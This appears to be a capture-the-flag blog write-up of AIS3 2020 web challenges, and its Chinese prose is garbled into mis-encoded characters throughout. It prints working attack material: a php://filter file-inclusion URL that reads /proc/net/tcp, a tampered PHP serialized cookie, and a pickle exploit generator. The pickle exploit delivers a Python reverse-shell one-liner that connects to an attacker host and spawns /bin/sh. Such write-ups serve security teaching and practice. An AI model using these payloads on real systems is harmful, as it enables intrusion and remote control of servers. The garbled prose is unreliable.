<p>å¯«çš„é€™éº¼å¤šåŸºæœ¬ä¸Šå°±æ˜¯åœ¨èªªé€™äº› PHP protocol å¯ä»¥ç”¨ä¾†å­˜å– filesystem çš„æ±è¥¿ã€‚é‚£éº¼ï¼Œå°æˆ‘ä¾†èªªåˆ°åº•èƒ½ç”¨å®ƒåšä»€éº¼å‘¢ï¼Ÿæˆ‘å€‘ä¾†çœ‹çœ‹é€™ç¯‡ <a href="https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/">Using php://filter for local file inclusion</a>ï¼Œæˆ‘å€‘å¾—çŸ¥å¯ä»¥é€é <code class="language-plaintext highlighter-rouge">php://filter/convert.base64-encode/resource=&lt;targetFile&gt;</code> ä¾†é€²è¡Œ filter evasionã€‚é‚£æˆ‘å€‘åœ¨çŸ¥é“é€™é»ä¹‹å¾Œè©²åšä»€éº¼å‘¢ï¼Ÿ</p>

<p>æˆ‘å€‘é€é <code class="language-plaintext highlighter-rouge">hint.txt</code> çŸ¥é“ä»–è¦æˆ‘å€‘å»æŒ–å…¶ä»–ä¼ºæœå™¨ä¸Šçš„ flagï¼Œé‚£æˆ‘å€‘åˆ°åº•è¦æ€éº¼çŸ¥é“å…§ç¶²çš„IPé•·ä»€éº¼æ¨£ï¼Ÿæ—¢ç„¶æ˜¯ä¼ºæœå™¨ï¼Œæˆ‘å€‘å¯ä»¥çŒœæ¸¬é€™å°é›»è…¦å¯èƒ½èˆ‡å…¶ä»–é›»è…¦ä¼ºæœå™¨æœƒé€²è¡Œæºé€šã€‚é€™æ™‚ï¼Œæˆ‘å€‘å¯ä»¥é€éåƒæ˜¯ <code class="language-plaintext highlighter-rouge">/proc/net/tcp</code> ä¹‹é¡çš„æª”æ¡ˆä¾†å¾—çŸ¥æœ‰èˆ‡é€™å°é›»è…¦é€²è¡Œ TCP é€£ç·šçš„å‹•ä½œã€‚</p>

<p>æ‰€ä»¥æˆ‘å€‘çš„ payload å¤§æ¦‚å¯ä»¥å¯«æˆé€™æ¨£ï¼š</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://shark.ais3.org/?path=php://filter/convert.base64-encode/resource=/proc/net/tcp
</code></pre></div></div>

<p>æˆ‘å€‘å¯¦éš›å»åŸ·è¡Œå¯ä»¥æ‹¿åˆ°ä»¥ä¸‹ Base64 çš„å­—ä¸²ï¼š</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ICBzbCAgbG9jYWxfYWRkcmVzcyByZW1fYWRkcmVzcyAgIHN0IHR4X3F1ZXVlIHJ4X3F1ZXVlIHRyIHRtLT53aGVuIHJldHJuc210ICAgdWlkICB0aW1lb3V0IGlub2RlICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgMDogMDAwMDAwMDA6MDA1MCAwMDAwMDAwMDowMDAwIDBBIDAwMDAwMDAwOjAwMDAwMDAwIDAwOjAwMDAwMDAwIDAwMDAwMDAwICAgICAwICAgICAgICAwIDEwNzc4MjE2NSAxIDAwMDAwMDAwZGJjZjMwZmYgOTkgMCAwIDEwIDAgICAgICAgICAgICAgICAgICAKICAgMTogMEIwMDAwN0Y6QTQzNSAwMDAwMDAwMDowMDAwIDBBIDAwMDAwMDAwOjAwMDAwMDAwIDAwOjAwMDAwMDAwIDAwMDAwMDAwICAgICAwICAgICAgICAwIDEwNzc1OTQwNiAxIDAwMDAwMDAwNTU2M2NmMTIgOTkgMCAwIDEwIDAgICAgICAgICAgICAgICAgICAKICAgMjogMDMwMDE2QUM6MDA1MCAwMTAwMTZBQzo5QTIwIDAxIDAwMDAwMDAwOjAwMDAwMDAwIDAyOjAwMEFGQzdGIDAwMDAwMDAwICAgIDMzICAgICAgICAwIDIwOTIzOTg1MCAyIDAwMDAwMDAwOTBiNTkxNTkgMjAgMyAzMCAxMCAtMSAgICAgICAgICAgICAgICAK
</code></pre></div></div>

<p>é€™æ™‚æ‹¿å»é¤µçµ¦ Base64 decode å°±å¯ä»¥æ‹¿åˆ°æˆ‘å€‘çš„çµæœäº†ï¼</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  sl  local_address rem_address   st tx_queue rx_queue tr tm-&gt;when retrnsmt   uid  timeout inode                                                     
   0: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 107782165 1 00000000dbcf30ff 99 0 0 10 0                  
   1: 0B00007F:A435 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 107759406 1 000000005563cf12 99 0 0 10 0                  
   2: 030016AC:0050 010016AC:9A20 01 00000000:00000000 02:000AFC7F 00000000    33        0 209239850 2 0000000090b59159 20 3 30 10 -1                
</code></pre></div></div>

<p>é‚£æˆ‘å€‘è¦æ€éº¼è§£è®€ <code class="language-plaintext highlighter-rouge">/proc/net/tcp</code> æª”æ¡ˆå‘¢ï¼Ÿé€™æ™‚æˆ‘å€‘å¯ä»¥å»çœ‹çœ‹ç›¸é—œçš„ <a href="https://metacpan.org/pod/release/SALVA/Linux-Proc-Net-TCP-0.05/lib/Linux/Proc/Net/TCP.pm">man page</a> ä¾†å¾—çŸ¥å¦‚ä½•è®€å–è©²æª”æ¡ˆã€‚</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  46: 010310AC:9C4C 030310AC:1770 01 
  |      |      |      |      |   |--&gt; connection state
  |      |      |      |      |------&gt; remote TCP port number
  |      |      |      |-------------&gt; remote IPv4 address
  |      |      |--------------------&gt; local TCP port number
  |      |---------------------------&gt; local IPv4 address
  |----------------------------------&gt; number of entry
</code></pre></div></div>

<p>æˆ‘å€‘é€éæ–‡ä»¶å¾—çŸ¥IPä½å€æ˜¯hex-encodedè€Œä¸”æ˜¯åéä¾†çš„ï¼Œæ‰€ä»¥é€™æ¨£æˆ‘å€‘å¯ä»¥æ¨å‡ºæˆ‘å€‘çš„ subnet æ˜¯ <code class="language-plaintext highlighter-rouge">172.22.0.0</code>ã€‚é€™æ™‚æˆ‘å€‘å¯ä»¥ä¸€å€‹ä¸€å€‹å»æˆ³çœ‹çœ‹ï¼Œç”¨PowerShellè·Ÿ ForEach Parallel æˆ‘å€‘å¯ä»¥å¾ˆå¿«åœ°å°±æˆ³åˆ°æˆ‘å€‘çš„çµæœã€‚</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/EONCWZz.png" alt="" /></p>

<p>Flag:
<code class="language-plaintext highlighter-rouge">AIS3{5h4rk5_d0n'7_5w1m_b4ckw4rd5}</code></p>

<h3 id="-elephant-168-pt">ğŸ˜ Elephant (168 pt.)</h3>

<blockquote>
  <p>Do elephants love cookies?</p>
</blockquote>

<p>é¦¬ä¸Šè¯æƒ³åˆ°é€™é¡Œæ‡‰è©²æ˜¯è·Ÿ Cookie æœ‰é—œçš„é¡Œç›®ã€‚æˆ‘å€‘ä¸€é–‹å§‹æœƒå…ˆçœ‹åˆ°é€™æ¨£çš„ç™»å…¥é é¢ã€‚</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/fuCZyzW.png" alt="" /></p>

<p>æˆ‘å€‘é€™æ™‚å¯ä»¥é€é Fiddler ä¾†çœ‹çœ‹æŒ‰ä¸‹ç™»å…¥æ™‚æœƒæœ‰ä»€éº¼é€£ç·šã€‚</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#	Result	Protocol	Host	URL	Body	Caching	Content-Type	Process	Comments	Custom	
6	302	HTTPS	elephant.ais3.org	/	0		text/html; charset=UTF-8	msedge:10224			
7	200	HTTPS	elephant.ais3.org	/	504		text/html; charset=UTF-8	msedge:10224			
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 302 Found
Server: nginx/1.18.0
Date: Tue, 16 Jun 2020 13:09:40 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 0
Connection: keep-alive
X-Powered-By: PHP/7.4.6
Location: /
Set-Cookie: elephant_user=Tzo0OiJVc2VyIjoyOntzOjQ6Im5hbWUiO3M6NzoiYXNkZmFzZCI7czoxMToiAFVzZXIAdG9rZW4iO3M6MzI6ImYyOGEzNzk4Njg4ZDI4ZTE1MDY5MWE5Mjc4NDZlYjM2Ijt9; expires=Tue, 16-Jun-2020 13:19:40 GMT; Max-Age=600
</code></pre></div></div>

<p>çœ‹èµ·ä¾†é¦–å…ˆæœƒå…ˆè¨­ç½® Cookie ç„¶å¾Œå†å°å›è‡³é¦–é ï¼Œä¸éé€™ Cookie çœ‹èµ·ä¾†ä¼¼ä¹æœ‰é»â€¦ ä¼¼æ›¾ç›¸è­˜ï¼Ÿæˆ‘å€‘é€é Fiddler çš„ TextWizard ä¾†çœ‹çœ‹è§£ä¸è§£åœ°å‡ºä¾†ã€‚</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/PABvoAJ.png" alt="" /></p>

<p>å•Šå“ˆï¼çœ‹èµ·ä¾†æ˜¯ Base64 å‘¢ï¼è€Œä¸”çœ‹èµ·ä¾†æ˜¯æŸç¨®åºåˆ—åŒ–å¾Œçš„çµæœã€‚æˆ‘å€‘ä¾†æŸ¥æŸ¥ <a href="https://www.php.net/manual/en/function.serialize.php">PHP çš„ Serialization ç›¸é—œæ–‡ä»¶</a>ã€‚</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?
/*
Anatomy of a serialize()'ed value:

String
s:size:value;

Integer
i:value;

Boolean
b:value; (does not store "true" or "false", does store '1' or '0')

Null
N;

Array
a:size:{key definition;value definition;(repeated per element)}

Object
O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}

String values are always in double quotes
Array keys are always integers or strings
    "null =&gt; 'value'" equates to 's:0:"";s:5:"value";',
    "true =&gt; 'value'" equates to 'i:1;s:5:"value";',
    "false =&gt; 'value'" equates to 'i:0;s:5:"value";',
    "array(whatever the contents) =&gt; 'value'" equates to an "illegal offset type" warning because you can't use an
    array as a key; however, if you use a variable containing an array as a key, it will equate to 's:5:"Array";s:5:"value";',
     and
    attempting to use an object as a key will result in the same behavior as using an array will.
*/
?&gt;
</code></pre></div></div>

<p>æˆ‘å€‘å¯ä»¥å¾ä¸­æ¨å‡ºé€™å€‹åŸæœ¬æ˜¯ä¸€å€‹ <code class="language-plaintext highlighter-rouge">User</code> classï¼Œç„¶å¾Œå…¶ä¸­çš„ Properties æœ‰ <code class="language-plaintext highlighter-rouge">[0x00]User[0x00]Token</code> åŠ <code class="language-plaintext highlighter-rouge">name</code>ã€‚ä½†æ˜¯æˆ‘å€‘çŸ¥é“äº†é€™é»åˆèƒ½æ€æ¨£ï¼Ÿæˆ‘åœ¨æ‰“çš„æ™‚å€™æœ‰è©¦éå°‡ username æ›ç‚º <code class="language-plaintext highlighter-rouge">admin</code> ç­‰å­—çœ¼ï¼Œä½†æƒ³ä¹ŸçŸ¥é“ä¸æœƒé€šï¼Œå› ç‚ºæˆ‘å€‘ç™»å…¥çš„æ™‚å€™å°±å¯ä»¥æ‰“ <code class="language-plaintext highlighter-rouge">admin</code> å•¦ï¼Ÿ</p>

<p>æˆ‘çš„å¦å¤–çš„æƒ³æ³•æ˜¯å¦‚æœæˆ‘è®“ä»–å™´éŒ¯æˆ–ç„¡æ³•ååºåˆ—åŒ–æœƒæ€éº¼æ¨£ï¼Ÿæ‰€ä»¥æˆ‘æŠŠåºåˆ—åŒ–çš„ Payload æ”¹æˆä»¥ä¸‹:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>O:4:"User":0:{}
</code></pre></div></div>

<p>å†å°‡å…¶ Base64 è¨­æˆ Cookie å¾Œå†é€å‡ºã€‚</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/1ZjBBkt.jpg" alt="" /></p>

<p>ç„¶å¾Œ Flag å°±è«åå…¶å¦™å™´å‡ºä¾†äº†(X)ã€‚å…¶å¯¦æˆ‘ä¸æ˜¯å¾ˆæ‡‚é€™é¡Œåœ¨è€ƒæˆ‘å€‘ä»€éº¼ï¼Œæ˜¯åœ¨è€ƒæˆ‘å€‘PHPåºåˆ—åŒ–å¾Œçš„dataé•·ä»€éº¼æ¨£å—ï¼Ÿæˆ‘å…¶å¯¦æ»¿å¥½å¥‡çš„ã€‚</p>

<p>Flag:
<code class="language-plaintext highlighter-rouge">AIS3{0nly_3l3ph4n75_5h0uld_0wn_1v0ry}</code></p>

<h3 id="-snake-272-pt">ğŸ Snake (272 pt.)</h3>

<p>Snake çš„é€£çµä¸€é–‹èµ·ä¾†æœƒçœ‹åˆ°ä»¥ä¸‹åŸå§‹ç¢¼ï¼š</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">Response</span><span class="p">,</span> <span class="n">request</span>
<span class="kn">import</span> <span class="nn">pickle</span><span class="p">,</span> <span class="n">base64</span><span class="p">,</span> <span class="n">traceback</span>

<span class="n">Response</span><span class="p">.</span><span class="n">default_mimetype</span> <span class="o">=</span> <span class="s">'text/plain'</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">values</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'data'</span><span class="p">)</span>
    
    <span class="k">if</span> <span class="n">data</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">data</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
            <span class="n">data</span> <span class="o">=</span> <span class="n">pickle</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
            
            <span class="k">if</span> <span class="n">data</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">data</span><span class="p">:</span>
                <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="s">'/flag'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>

            <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">traceback</span><span class="p">.</span><span class="n">format_exc</span><span class="p">()</span>
        
    <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="n">__file__</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
</code></pre></div></div>

<p>é›–ç„¶ä¹‹å‰æ²’ç¢°é Flaskï¼Œå¯æ˜¯é€™é¡Œå¾ˆæ˜é¡¯ä¸éœ€è¦çŸ¥é“ Flaskï¼Œå› ç‚ºä¸€çœ‹å°±çŸ¥é“é€™é¡Œæœ€å¤§çš„å•é¡Œæ˜¯ Pickle (L15)ã€‚ <code class="language-plaintext highlighter-rouge">pickle.loads</code> å¯ä»¥èªªæ˜¯éå¸¸å±éšªçš„ä¸€å€‹ callï¼Œç”šè‡³é€£<a href="https://docs.python.org/3/library/pickle.html">å®˜æ–¹æ–‡ä»¶</a>éƒ½é€™éº¼å¯«ï¼š</p>

<blockquote class="notice--danger">
  <p>The pickle module is not secure. Only unpickle data you trust. It is possible to construct malicious pickle data which will execute arbitrary code during unpickling. Never unpickle data that could have come from an untrusted source, or that could have been tampered with.</p>
</blockquote>

<p>æ—¢ç„¶æˆ‘å€‘çŸ¥é“æœ‰å¯èƒ½å¯ä»¥é€²è¡Œ ACE (Arbitrary Code Execution)ï¼Œé‚£æˆ‘å€‘å°±ä¾†å¯«å¯«çœ‹æˆ‘å€‘çš„ payloadã€‚å°æˆ‘å€‘ä¾†èªªæ—¢ç„¶çŸ¥é“èƒ½é€²è¡Œ ACEï¼Œæœ€æ–¹ä¾¿çš„æ–¹å¼å°±æ˜¯å¯«å€‹ Reverse Shell åˆ°äººå®¶é›»è…¦ä¸Šæ—äº‚ã€‚</p>

<div class="notice--info">
  
<p>å»¶ä¼¸é–±è®€ï¼š</p>
<ul>
  <li><a href="https://davidhamann.de/2020/04/05/exploiting-python-pickle/">Exploiting Python pickles</a></li>
  <li><a href="/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf">Security Issues in Python Pickle</a></li>
  <li><a href="https://root4loot.com/post/exploiting_cpickle/">Pickle Arbitrary Code Execution</a></li>
</ul>

</div>

<p>é€éä¸€äº›å»¶ä¼¸é–±è®€ï¼Œå‡ºäº†ä¸‹åˆ—æŒ‡ä»¤ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import sys,socket,os,pty;s=socket.socket();s.connect((AttackerIP, AttackPort));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")
</code></pre></div></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">command</span><span class="p">):</span>
    <span class="k">assert</span> <span class="nb">type</span><span class="p">(</span><span class="n">command</span><span class="p">)</span> <span class="ow">is</span> <span class="nb">list</span>
    <span class="n">payload_prefix</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'''(('''</span>
    <span class="n">payload_suffix</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'''lisubprocess</span><span class="se">\n</span><span class="s">Popen</span><span class="se">\n</span><span class="s">.'''</span>
    <span class="n">payload_body</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">()</span>
    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">command</span><span class="p">:</span>
        <span class="n">payload_body</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"X"</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">c</span><span class="p">)))</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s">"utf-8"</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload_prefix</span> <span class="o">+</span> <span class="n">payload_body</span> <span class="o">+</span> <span class="n">payload_suffix</span>
    <span class="k">assert</span> <span class="sa">b</span><span class="s">'R'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">payload</span>
    <span class="k">return</span> <span class="n">payload</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">exploit</span><span class="p">([</span>
        <span class="s">"python"</span><span class="p">,</span>
        <span class="s">"-c"</span><span class="p">,</span>
        <span class="n">command</span>
    <span class="p">])</span>
    <span class="k">print</span><span class="p">(</span><span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
</code></pre></div></div>

<p>åœ¨æœ¬åœ°ç«¯è¨­å®šå¥½netcatï¼Œå°‡å…¶Base64 outputä¸Ÿå›è‡³ä¼ºæœå™¨ä¸­ï¼Œå°±æˆåŠŸæ‹¿åˆ°äº†å°æ–¹é›»è…¦çš„ Shell!</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/C7JcqEm.png" alt="" /></p>

<p><img src="/assets/images/posts/ais3-2020-writeup/BkFNr6O.png" alt="" /></p>

<p>é€™é¡Œæˆ‘é‚„æ»¿å–œæ­¡çš„ï¼Œé€™å‘Šè¨´äº†å¤§å®¶ <code class="language-plaintext highlighter-rouge">pickle.loads</code> æ˜¯å€‹å¤šéº¼å±éšªçš„æ±è¥¿ã€‚</p>

<h3 id="-rhino-494-pt">ğŸ¦ Rhino (494 pt.)</h3>

<p>Rhino é€™é¡Œå¾ HTML head å°±å¯ä»¥çœ‹å‡ºä¾†æ˜¯ Jekyll å‡ºä¾†çš„éœæ…‹ç¶²ç«™ï¼Œæ‰€ä»¥å†æ€éº¼æˆ³é€™ç¶²ç«™ä¹Ÿä¸æœƒå™´å‡ºä»€éº¼å¥‡æ€ªæ±è¥¿çš„ã€‚</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- Begin Jekyll SEO tag v2.6.1 --&gt;</span>
<span class="nt">&lt;title&gt;</span>A Lonely Programmer | As you can see in the title, I am a lonely programmer. My favorite programming language is JavaScript and my favorite animal is rhino.<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"generator"</span> <span class="na">content=</span><span class="s">"Jekyll v4.0.1"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">property=</span><span class="s">"og:title"</span> <span class="na">content=</span><span class="s">"A Lonely Programmer"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">property=</span><span class="s">"og:locale"</span> <span class="na">content=</span><span class="s">"en_US"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"description"</span> <span class="na">content=</span><span class="s">"As you can see in the title, I am a lonely programmer. My favorite programming language is JavaScript and my favorite animal is rhino."</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">property=</span><span class="s">"og:description"</span> <span class="na">content=</span><span class="s">"As you can see in the title, I am a lonely programmer. My favorite programming language is JavaScript and my favorite animal is rhino."</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"canonical"</span> <span class="na">href=</span><span class="s">"/"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">property=</span><span class="s">"og:url"</span> <span class="na">content=</span><span class="s">"/"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">property=</span><span class="s">"og:site_name"</span> <span class="na">content=</span><span class="s">"A Lonely Programmer"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"application/ld+json"</span><span class="nt">&gt;</span>
<span class="p">{</span><span class="dl">"</span><span class="s2">headline</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">A Lonely Programmer</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">description</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">As you can see in the title, I am a lonely programmer. My favorite programming language is JavaScript and my favorite animal is rhino.</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">A Lonely Programmer</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">url</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">/</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">@type</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">WebSite</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">@context</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">https://schema.org</span><span class="dl">"</span><span class="p">}</span><span class="nt">&lt;/script&gt;</span>
<span class="c">&lt;!-- End Jekyll SEO tag --&gt;</span>
</code></pre></div></div>

<p>é‚£å°±â€¦ ç¶²ç«™èµ·æ‰‹å¼å…ˆçœ‹çœ‹ robots.txt/humans.txt æœ‰æ²’æœ‰æ±è¥¿å›‰ï¼Ÿ</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/rSmNxmC.png" alt="" /></p>

<p>å…¶å¯¦ç•¶ä¸‹æ»¿æ„å¤–æœƒæœ‰çš„ï¼Œç•¢ç«Ÿæ˜¯è€ƒåˆ°çˆ›çš„æç¤º(X)ï¼Œä½†é€™çµ¦äº†æˆ‘å€‘è¨±å¤šç›¸é—œéœ€è¦çŸ¥é“çš„æ±è¥¿ã€‚</p>

<ul>
  <li>é€™å€‹ç¶²ç«™æ˜¯ Node.JS ç•¶åŸºåº•çš„ (<code class="language-plaintext highlighter-rouge">node_modules</code>)</li>
  <li>æ ¹ç›®éŒ„ä¸‹<em>å¯èƒ½</em>æœ‰ .js åŠ .json åŠ .xml æª”</li>
  <li>æœ‰ flag.txt
    <ul>
      <li>æƒ³ä¹ŸçŸ¥é“ç¶²ç«™ä¸å¯èƒ½é€™éº¼å®¹æ˜“å°±çµ¦æˆ‘å€‘ flag çš„</li>
    </ul>
  </li>
</ul>

<p>é‚£æˆ‘å€‘æ—¢ç„¶çŸ¥é“æ˜¯ Node-basedï¼Œé‚£æˆ‘å€‘ä¾†æˆ³æˆ³çœ‹æœ‰æ²’æœ‰ <code class="language-plaintext highlighter-rouge">package.json</code>ã€‚</p>

<pre><code class="language-jsonld">{
  "name": "app",
  "version": "1.0.0",
  "description": "",
  "scripts": {
    "start": "node chill.js",
    "test": "echo \"Error: no test specified\" &amp;&amp; exit 1"
  },
  "author": "djosix",
  "license": "ISC",
  "dependencies": {
    "cookie-session": "^1.4.0",
    "express": "^4.17.1"
  }
}
</code></pre>

<p>æœ‰æ¬¸ï¼ä¸»ç¨‹å¼æ˜¯åœ¨ <code class="language-plaintext highlighter-rouge">chill.js</code>ï¼Œæˆ‘å€‘ä¾†çœ‹çœ‹é‚£å€‹è£¡é¢æ˜¯ä»€éº¼ï¼Ÿ</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">session</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">cookie-session</span><span class="dl">'</span><span class="p">);</span>

<span class="kd">let</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">session</span><span class="p">({</span>
  <span class="na">secret</span><span class="p">:</span> <span class="dl">"</span><span class="s2">I'm watching you.</span><span class="dl">"</span>
<span class="p">}));</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="nx">express</span><span class="p">.</span><span class="kd">static</span><span class="p">(</span><span class="dl">'</span><span class="s1">./</span><span class="dl">'</span><span class="p">));</span>

<span class="nx">app</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/flag.txt</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="nx">res</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-Type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">text/plain</span><span class="dl">'</span><span class="p">);</span>

  <span class="kd">let</span> <span class="nx">n</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">magic</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="nx">n</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">n</span> <span class="o">+</span> <span class="mi">420</span><span class="p">)</span> <span class="o">===</span> <span class="mi">420</span><span class="p">)</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">sendFile</span><span class="p">(</span><span class="dl">'</span><span class="s1">/flag</span><span class="dl">'</span><span class="p">);</span>
  <span class="k">else</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">you are a sad person too</span><span class="dl">'</span><span class="p">);</span>
<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">*</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">){</span>
  <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">404</span><span class="p">).</span><span class="nx">sendFile</span><span class="p">(</span><span class="dl">'</span><span class="s1">404.html</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="na">root</span><span class="p">:</span> <span class="nx">__dirname</span> <span class="p">});</span>
<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">PORT</span><span class="p">,</span> <span class="dl">'</span><span class="s1">0.0.0.0</span><span class="dl">'</span><span class="p">);</span>
</code></pre></div></div>

<p>çœ‹èµ·ä¾†æˆ‘å€‘å¾—è‡ªè¡Œæ‰¾å‡ºä¸€å€‹æœ‰è¢« <code class="language-plaintext highlighter-rouge">I'm watching you.</code> ç°½ç« çš„ Cookie è€Œä¸” <code class="language-plaintext highlighter-rouge">magic</code> å€¼é‚„å¿…é ˆä¸ç­‰æ–¼ 0 å¯æ˜¯è·Ÿ 420 ç›¸åŠ æ™‚é‚„å¾—è¦ 420ã€‚</p>

